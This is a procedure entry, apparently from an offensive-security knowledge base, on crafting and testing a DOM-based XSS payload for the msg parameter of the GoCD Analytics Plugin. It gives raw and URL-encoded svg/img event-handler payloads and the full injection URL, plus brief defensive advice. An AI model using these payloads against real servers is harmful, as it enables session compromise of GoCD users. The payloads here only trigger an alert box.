---
id: proc-gocd-payload-003
tags:
  - xss
  - payload-crafting
  - gocd
  - javascript
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.677Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Test-XSS-Payload-for-GoCD-msg-Parameter

## Summary

This procedure crafts a URL-encoded JavaScript payload for the msg parameter in the GoCD Analytics Plugin and tests it to execute arbitrary code, exploiting the DOM-based XSS vulnerability.

## Description

In the attack scenario, the payload is designed to bypass any minimal filtering and inject executable HTML like SVG or IMG tags with event handlers. The target is the plugin's info page on a running GoCD server; prerequisites include knowledge of the vulnerable endpoint. Expected outcomes: Alert box or other JS execution confirming compromise of user sessions.

## Requirements

1. Access to the vulnerable GoCD Analytics Plugin URL
2. URL encoding tool or manual knowledge
3. Browser to test the payload

## Defense

Defensive measures and detection strategies:

- Validate and escape all URL parameters server-side before client-side processing
- Implement strict CSP headers to block unsafe-inline scripts
- Log and monitor unusual URL parameters in access logs

## Objectives

1. Create an encoded payload that injects executable JavaScript
2. Deliver it via the msg parameter to trigger XSS
3. Verify execution and potential impacts like data theft

## Instructions

### Step 1: Design the Payload

**Context**: Select a cross-browser compatible script injection vector.

Choose: <svg/onload=alert("XSS") > or alternative <img src=x onerror=alert(/XSS/) />

> These use onload or onerror events to execute JS without needing <script> tags.

### Step 2: URL Encode the Payload

**Context**: Encode to survive URL transmission and decoding.

Encode: ?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E

> This decodes to <svg/onload=alert("XSS") >; use browser dev tools or online encoders.

### Step 3: Inject and Test

**Context**: Append the payload to the plugin's info page URL and load it.

Access: [target]/assets/js/pages/info-message.html?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E

> Expected output: Alert dialog with "XSS" appears, confirming execution in the page context.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- payload-injection
- exploitation-test
